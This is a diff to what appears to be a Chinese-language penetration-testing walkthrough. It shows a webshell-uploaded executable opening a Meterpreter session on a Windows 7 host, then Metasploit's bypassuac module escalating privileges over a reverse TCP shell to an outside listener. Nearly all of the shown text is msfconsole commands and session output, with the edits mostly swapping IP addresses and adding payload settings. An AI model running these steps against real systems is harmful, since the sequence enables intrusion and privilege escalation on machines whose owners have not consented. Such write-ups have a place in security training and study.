@@ -132,8 +132,8 @@ msf exploit(multi/handler) >
 通过菜刀执行上传的aa.exe，菜刀显示执行错误，但是msf已经成功与目标建立了一个会话
 ```
 msf exploit(multi/handler) >
-[*] Sending stage (179779 bytes) to 211.123.123.72
-[*] Meterpreter session 1 opened (192.168.0.195:8888 -> 211.123.123.72:34576) at 2018-02-26 12:26:32 +0800
+[*] Sending stage (179779 bytes) to 211.222.222.72
+[*] Meterpreter session 1 opened (192.168.0.195:8888 -> 211.222.222.72:34576) at 2018-02-26 12:26:32 +0800
 
 msf exploit(multi/handler) > sessions
 
@@ -142,7 +142,7 @@ Active sessions
 
   Id  Name  Type                     Information                    Connection
   --  ----  ----                     -----------                    ----------
-  1         meterpreter x86/windows  REBER-WIN7\reber @ REBER-WIN7  192.168.0.195:8888 -> 211.123.123.72:34576 (10.11.11.20)
+  1         meterpreter x86/windows  REBER-WIN7\reber @ REBER-WIN7  192.168.0.195:8888 -> 211.222.222.72:34576 (10.11.11.20)
 
 msf exploit(multi/handler) > sessions -i 1
 [*] Starting interaction with 1...
@@ -166,6 +166,8 @@ msf exploit(multi/handler) >
 前面通过systeminfo得知为Win7主机，只有一个补丁，直接尝试绕过UAC进行提权
 ```
 msf exploit(multi/handler) > use exploit/windows/local/bypassuac
+msf exploit(windows/local/bypassuac) > set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
 msf exploit(windows/local/bypassuac) > options
 
 Module options (exploit/windows/local/bypassuac):
@@ -173,7 +175,16 @@ Module options (exploit/windows/local/bypassuac):
    Name       Current Setting  Required  Description
    ----       ---------------  --------  -----------
    SESSION                     yes       The session to run this module on.
-   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PS   H, EXE)
+   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address
+   LPORT     4444             yes       The listen port
 
 
 Exploit target:
@@ -185,44 +196,6 @@ Exploit target:
 
 msf exploit(windows/local/bypassuac) > set session 1
 session => 1
-msf exploit(windows/local/bypassuac) > run
-
-[*] Started reverse TCP handler on 192.168.0.195:4444
-[*] UAC is Enabled, checking level...
-[+] UAC is set to Default
-[+] BypassUAC can bypass this setting, continuing...
-[+] Part of Administrators group! Continuing...
-[*] Uploaded the agent to the filesystem....
-[*] Uploading the bypass UAC executable to the filesystem...
-[*] Meterpreter stager executable 73802 bytes long being uploaded..
-[-] Exploit failed [timeout-expired]: Timeout::Error execution expired
-[*] Exploit completed, but no session was created.
-msf exploit(windows/local/bypassuac) > options
-
-Module options (exploit/windows/local/bypassuac):
-
-   Name       Current Setting  Required  Description
-   ----       ---------------  --------  -----------
-   SESSION    1                yes       The session to run this module on.
-   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PS   H, EXE)
-
-
-Payload options (windows/meterpreter/reverse_tcp):
-
-   Name      Current Setting  Required  Description
-   ----      ---------------  --------  -----------
-   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process,    none)
-   LHOST     192.168.0.195    yes       The listen address
-   LPORT     4444             yes       The listen port
-
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   0   Windows x86
-
-
 msf exploit(windows/local/bypassuac) > set LHOST 114.115.123.123
 LHOST => 114.115.123.123
 msf exploit(windows/local/bypassuac) > set LPORT 6666
@@ -255,7 +228,8 @@ Exploit target:
 
 msf exploit(windows/local/bypassuac) > run
 
-[*] Started reverse TCP handler on 114.115.123.123:6666
+[-] Handler failed to bind to 114.115.123.123:6666:-  -
+[*] Started reverse TCP handler on 0.0.0.0:6666
 [*] UAC is Enabled, checking level...
 [+] UAC is set to Default
 [+] BypassUAC can bypass this setting, continuing...
@@ -263,8 +237,8 @@ msf exploit(windows/local/bypassuac) > run
 [*] Uploaded the agent to the filesystem....
 [*] Uploading the bypass UAC executable to the filesystem...
 [*] Meterpreter stager executable 73802 bytes long being uploaded..
-[*] Sending stage (179779 bytes) to 211.123.123.72
-[*] Meterpreter session 2 opened (192.168.0.195:6666 -> 211.123.123.72:36519) at 2018-02-26 12:52:54 +0800
+[*] Sending stage (179779 bytes) to 211.222.222.72
+[*] Meterpreter session 2 opened (192.168.0.195:6666 -> 211.222.222.72:39027) at 2018-02-26 16:29:34 +0800
 
 meterpreter > getuid
 Server username: REBER-WIN7\reber
